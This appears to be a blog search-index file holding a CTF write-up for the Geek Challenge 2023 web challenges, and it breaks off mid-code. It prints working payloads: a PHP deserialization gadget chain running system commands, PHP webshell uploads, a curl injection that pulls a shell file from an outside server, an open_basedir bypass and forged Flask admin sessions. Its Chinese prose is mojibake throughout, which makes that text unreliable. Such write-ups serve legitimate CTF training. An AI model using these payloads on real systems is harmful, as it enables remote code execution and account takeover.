<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜2023</title>
      <link href="/2023/12/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/"/>
      <url>/2023/12/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/http.png" alt=""></p><p>è¿›è¡Œpostä¼ å‚ï¼Œä½†æ˜¯ä¸çŸ¥é“è´¦å·å’Œå¯†ç ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºï¼š<br><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/http2.png" alt=""></p><p>è®¿é—®robots.txtï¼Œå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/http3.png" alt=""></p><p>postä¼ å‚ï¼Œå¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼š</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/http4.png" alt=""></p><p>æ¥ä¸‹æ¥ä¿®æ”¹httpè¯·æ±‚å¤´å³å¯ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Referer: sycsec.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Via: Syc.vip</span><br><span class="line">O2TAKUXX: GiveMeFlag</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æˆ–æ·»åŠ ä¸Šé¢çš„httpè¯·æ±‚å¤´ï¼Œè·å¾—flagï¼š</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/http5.png" alt=""></p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>] !== <span class="string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>]) &lt; <span class="number">2023</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>] + <span class="number">1</span>) &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$array1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>];</span><br><span class="line">            <span class="variable">$array2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$array1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$array2</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="string">&quot;Happy to see you!&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;å†ç»•æœ€åä¸€æ­¥å§&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å¥½å“©ï¼Œå¿«æ‹¿åˆ°flagå•¦&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿™é‡Œç»•ä¸è¿‡å»ï¼ŒQWå¯ä¸ç­”åº”äº†å“ˆ&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å˜¿å˜¿å˜¿ï¼Œä½ åˆ«æ€¥å•Š&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸ä¼šå§ä¸ä¼šå§ï¼Œä¸ä¼šç¬¬ä¸€æ­¥å°±å¡ä½äº†å§ï¼Œyxxä¼šç§ä¸èµ·ä½ çš„ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è€ƒç‚¹ï¼š</p><blockquote><p>phpå„ç§ç»•è¿‡</p></blockquote><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?syc=Welcome%<span class="number">20</span>to%<span class="number">20</span>GEEK%<span class="number">202023</span>!%<span class="number">0</span>a&amp;lover=<span class="number">2e4</span></span><br><span class="line"></span><br><span class="line">qw=<span class="number">1</span>&amp;yxx=<span class="number">1</span>&amp;SYC[GEEK.<span class="number">2023</span>=Happy to see you!</span><br></pre></td></tr></table></figure><h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();</span><br><span class="line"><span class="variable">$l</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$l</span>-&gt;yxx=<span class="variable">$w</span>;</span><br><span class="line"><span class="variable">$l</span>-&gt;QW=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;cuit=<span class="variable">$l</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;eva1=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">url=O:<span class="number">3</span>:<span class="string">&quot;syc&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;cuit&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;lover&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;yxx&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;web&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;eva1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;interesting&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;QW&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h2><p>ç»å…¸æ–‡ä»¶ä¸Šä¼ </p><p>å…ˆå‡†å¤‡å¥½ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯å­˜åœ¨æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼Œåˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡</p><p>åç¼€æ”¹ä¸ºjpgï¼ŒæŠ“åŒ…ä¿®æ”¹ä¸ºphpï¼Œä¸Šä¼ æˆåŠŸï¼Œå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;s.php&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// curl your domain</span></span><br><span class="line"><span class="comment">// flag is in /tmp/Syclover</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|f|:|\||\&amp;|!|&gt;|&lt;|`|\(|&#123;|\?|\n|\r/i&quot;</span>, <span class="variable">$address</span>))&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&gt; /dev/null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰“å¼€åï¼Œå‘ç°æ˜¯ä¸€ä¸ªå…·æœ‰curlåŠŸèƒ½çš„ç½‘ç«™ï¼Œä¸Šç½‘æŸ¥è¯¢å…³äºcurlå‘½ä»¤çš„å‚æ•°</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/curl.png" alt=""></p><p>åˆ©ç”¨payload</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?addr=-o sh.php ip/shell.txt  &amp;&amp;echo 1// é€šè¿‡curlï¼Œå°†è‡ªå·±vpsä¸Šçš„æ–‡ä»¶å†™å…¥æœåŠ¡å™¨å½“å‰ç›®å½•ä¸­</span><br><span class="line"></span><br><span class="line">/sh.php //è®¿é—®è¯¥æ–‡ä»¶ï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç </span><br><span class="line"></span><br><span class="line">å°±èƒ½å®ç°å‘½ä»¤æ³¨å…¥</span><br></pre></td></tr></table></figure><h2 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;å¿«æ¥ç©å¿«æ¥ç©~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦ç»•è¿‡çš„æœ‰ä¸¤ç‚¹ï¼š</p><blockquote><ol><li>æ­£åˆ™åŒ¹é…ï¼šåˆ©ç”¨åå…­è¿›åˆ¶ç»•è¿‡</li><li>å¼‚å¸¸å¤„ç†ï¼šåˆ©ç”¨GCå›æ”¶æœºåˆ¶ç»•è¿‡</li></ol></blockquote><p>åœ¨åˆ©ç”¨ä¼ªåè®®ç»“åˆååºåˆ—åŒ–æˆåŠŸå†™é©¬ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦ç”¨äº†ï¼Œä¹Ÿé™åˆ¶äº†ç›®å½•è®¿é—®</p><p>å‚è€ƒä¸€ä¸‹å¤§ä½¬çš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/snowlyzz/article/details/126310439">æµ…è°ˆç»•è¿‡open_basedir çš„å‡ ç§ç”¨æ³•_snowlyzzçš„åšå®¢-CSDNåšå®¢</a></p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?web=a:2:&#123;i:0;O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\6C\6F\76\65\72&quot;;s:108:&quot;file_put_contents(&#x27;php://filter/write=convert.base64-decode/resource=2.php&#x27;,&#x27;PD89ZXZhbCgkX1BPU1RbMV0pOw==&#x27;);&quot;;&#125;i:0;i:0;&#125; </span><br><span class="line"></span><br><span class="line">è®¿é—®2.phpï¼Œpostä¼ å‚</span><br><span class="line"></span><br><span class="line">1=mkdir(&#x27;a&#x27;);chdir(&#x27;a&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;.&#x27;));readfile(&#x27;/f1ger&#x27;);</span><br></pre></td></tr></table></figure><h2 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h2><p>å‘ç°æœ‰ä¸ªç™»å½•å’Œæ³¨å†Œçš„åŠŸèƒ½ï¼Œå…¶ä»–ä¿¡æ¯æš‚æ— </p><p>å°è¯•æ‰«ä¸€ä¸‹ç›®å½•ï¼š</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/flask.png" alt=""></p><p>å‘ç°æ•æ„Ÿæ–‡ä»¶ï¼Œè®¿é—®<code>robots.txt</code></p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/flask1.png" alt=""></p><p>è®¿é—®åæŸ¥çœ‹æºç ï¼Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- keyæ˜¯  app.secret_key = &#x27;wanbao&#x27;+base64.b64encode(str(random.randint(1, 100)).encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)+&#x27;wanbao&#x27; (www,æˆ‘å¯çˆ±çš„è€å®,æˆ‘å­˜çš„å¤Ÿå®‰å…¨çš„å§) --&gt;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://mp.weixin.qq.com/s/hVdTVguZD85qymOYIUFaQQ">flask sessionå®‰å…¨é—®é¢˜</a></p><p>æ ¹æ®é“¾æ¥ä¸­çš„å·¥å…·å¯çŸ¥ï¼š</p><blockquote><p><code>flask-unsign</code>: è¯¥å·¥å…·å¯ä»¥çˆ†ç ´å‡ºflask sessionçš„å¯†é’¥ï¼Œé€šè¿‡<code>-w [wordlist]</code>èƒ½å¤ŸæŒ‡å®šçˆ†ç ´å¯†é’¥åˆ—è¡¨</p><p><code>flask-session-cookie-manager</code>ï¼š è¯¥å·¥å…·å¯ä»¥é€šè¿‡æŒ‡å®šçš„å¯†é’¥å’Œæ•°æ®è¿›è¡ŒsessionåŠ è§£å¯†</p></blockquote><p>é€šè¿‡ä¸Šé¢æºç å¯çŸ¥ï¼šè¯¥sessionå¯†é’¥æ˜¯é€šè¿‡è‡ªå®šä¹‰åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œå¯†é’¥æ ¼å¼ä¸ºå›ºå®šå‰ç¼€åŠ éšæœºæ•°(1-100)åŠ å›ºå®šåç¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥pythonè¯­å¥å°†æ‰€æœ‰ç»“æœè‡ªè¡Œè·‘å‡ºæ¥ï¼Œä½¿å…¶æˆä¸ºæˆ‘ä»¬çˆ†ç ´sessionå¯†é’¥çš„ä¸€ä¸ªå‚ç…§åˆ—è¡¨</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/flask3.png" alt=""></p><p>é€šè¿‡ä¸Šè¿°å‘½ä»¤å°†å¯†é’¥çˆ†ç ´å‡ºæ¥ï¼Œåœ¨åˆ©ç”¨å¦ä¸€ä¸ªå·¥å…·å°†æ•°æ®è§£å¯†</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/flask4.png" alt=""></p><p><code>&#123;&#39;is_admin&#39;: False, &#39;name&#39;: &#39;111111&#39;, &#39;user_id&#39;: 2&#125;</code></p><p>å› ä¸ºè¦ä¼ªé€ adminçš„sessionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹è¯¥æ•°æ®è¿›è¡Œä¿®æ”¹ï¼š<code>&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: 1&#125;</code></p><blockquote><p><code>is_admin</code>ä¿®æ”¹ä¸º<code>True</code></p><p><code>name</code>é€šè¿‡å‰é¢æ³¨å†Œè´¦å·æ—¶å¯çŸ¥å­˜åœ¨adminç”¨æˆ·ï¼Œæ‰€ä»¥å°†å…¶ä¿®æ”¹ä¸º<code>admin</code></p><p><code>user_id</code>å½“å‰idæ˜¯2ï¼Œè¯´æ˜åœ¨æˆ‘ä»¬ä¹‹å‰å­˜åœ¨ä¸€ä¸ªç”¨æˆ·çš„idæ˜¯1ï¼Œåˆ†æå¯çŸ¥ï¼Œadminçš„idæ˜¯1ï¼Œæ‰€ä»¥å°†å…¶ä¿®æ”¹ä¸º<code>1</code></p></blockquote><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/flask5.png" alt=""></p><p>æ‹¿åˆ°æ„é€ åçš„sessionï¼Œé€šè¿‡burpæŠ“åŒ…ï¼Œä¿®æ”¹cookieçš„å€¼ï¼Œè¿›è¡Œå¤šæ¬¡æ”¾åŒ…ï¼ˆæ³¨æ„æ¯æ¬¡å‡ºç°cookieçš„å€¼éƒ½éœ€è¦ä¿®æ”¹ï¼‰</p><p>æœ€ç»ˆæ‹¿åˆ°flag</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/flask6.png" alt=""></p><h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(flag.php);</span><br><span class="line"><span class="comment">//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/env|var|session|header/i&quot;</span>, <span class="variable">$var</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span 